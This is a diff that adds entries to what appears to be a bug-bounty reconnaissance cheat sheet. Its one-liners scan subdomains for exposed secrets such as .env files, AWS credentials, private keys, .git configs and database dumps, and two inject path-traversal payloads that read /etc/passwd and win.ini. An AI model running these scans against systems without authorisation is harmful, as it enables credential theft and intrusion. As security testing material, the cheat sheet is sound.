@@ -1754,7 +1754,6 @@ Search for Open API Documentation (Swagger)
 ```bash
 cat subdomains.txt | httpx -silent -path-list <(echo -e '/swagger-ui.html\n/api-docs\n/openapi.json') -mc 200 -o open_api_docs.txt
 ```
-Here’s the converted content:
 
 Find Exposed .env Files (Sensitive Configs)
 ```bash
@@ -1869,4 +1868,114 @@ cat subdomains.txt | httpx -silent -mc 200 -fr 'Index of /' -o open_directories.
 Find Public GraphQL Endpoints (API Leaks)
 ```bash
 cat subdomains.txt | httpx -silent -path /graphql -mc 200 -o open_graphql.txt
+```
+
+Identify Misconfigured AWS Bucket via Headers
+```bash
+cat urls.txt | httpx -silent -hx | grep -i 'x-amz' > aws_bucket_leaks.txt
+```
+
+Check for Publicly Accessible Jenkins Script Console
+```bash
+cat subdomains.txt | httpx -silent -path /script -mc 200 -o jenkins_script_console.txt
+```
+
+Check for Exposed SVN Files
+```bash
+cat subdomains.txt | httpx -silent -path /.svn/entries -mc 200 -o svn_leaks.txt
+```
+
+Find Publicly Exposed Config.json Files
+```bash
+cat subdomains.txt | httpx -silent -path /config.json -mc 200 -o config_json_exposed.txt
+```
+
+Identify Unauthenticated Redis Servers
+```bash
+cat ips.txt | naabu -p 6379 -silent -o open_redis.txt
+```
+
+Detect Exposed Private Keys in URLs
+```bash
+cat urls.txt | grep -Ei 'private_key|id_rsa|pem' > private_key_leaks.txt
+```
+
+Search for Open API Keys in URLs
+```bash
+cat urls.txt | grep -Ei 'apikey|api_key|token' > exposed_api_keys.txt
+```
+
+Detect Exposed .bash_history Files
+```bash
+cat subdomains.txt | httpx -silent -path /.bash_history -mc 200 -o bash_history_exposed.txt
+```
+
+Check for Open etc/passwd via LFI
+```bash
+cat urls.txt | qsreplace '../../../../../etc/passwd' | httpx -silent -fr 'root:x:' -o lfi_passwd.txt
+```
+
+Find Open Exposed Backup ZIP Files
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/site_backup.zip\n/db_backup.zip') -mc 200 -o backup_zip_exposed.txt
+```
+
+Detect Exposed Logs (server.log, error.log)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/server.log\n/error.log\n/application.log') -mc 200 -o exposed_logs.txt
+```
+
+Find Publicly Accessible Admin Panels (General)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/admin\n/administrator\n/admin/login\n/admin.php\n/adminer.php') -mc 200 -o open_admin_panels.txt
+```
+
+Detect Exposed YAML Config Files
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/config.yaml\n/application.yaml') -mc 200 -o exposed_yaml.txt
+```
+
+Check for Directory Traversal to Windows Files
+```bash
+cat urls.txt | qsreplace 'C:\Windows\win.ini' | httpx -silent -fr 'for 16-bit app support' -o windows_lfi.txt
+```
+
+Find Open Jupyter Notebooks (No Auth)
+```bash
+cat subdomains.txt | httpx -silent -path /tree -mc 200 -o open_jupyter.txt
+```
+
+Identify Server Error Pages (500 Errors)
+```bash
+cat urls.txt | httpx -silent -mc 500 -o server_errors.txt
+```
+
+Check for Open SNMP Services
+```bash
+cat ips.txt | naabu -p 161 -silent -o open_snmp.txt
+```
+
+Find Exposed Laravel Environment Files (.env)
+```bash
+cat subdomains.txt | httpx -silent -path /.env -mc 200 -o exposed_env_files.txt
+```
+
+Detect Git Repository Exposures (.git/config)
+```bash
+cat subdomains.txt | httpx -silent -path /.git/config -mc 200 -o exposed_git_configs.txt
+```
+
+Look for Exposed Dockerfiles
+```bash
+cat subdomains.txt | httpx -silent -path /Dockerfile -mc 200 -o exposed_dockerfiles.txt
+```
+
+Identify Publicly Accessible AWS Credentials
+```bash
+cat subdomains.txt | httpx -silent -path /aws/credentials -mc 200 -o exposed_aws_credentials.txt
+```
+
+Search for Backup Database Dumps (SQL, SQLite)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/db.sql\n/database.sql\n/dump.sql\n/backup.db') -mc 200 -o db_dumps.txt
 ```
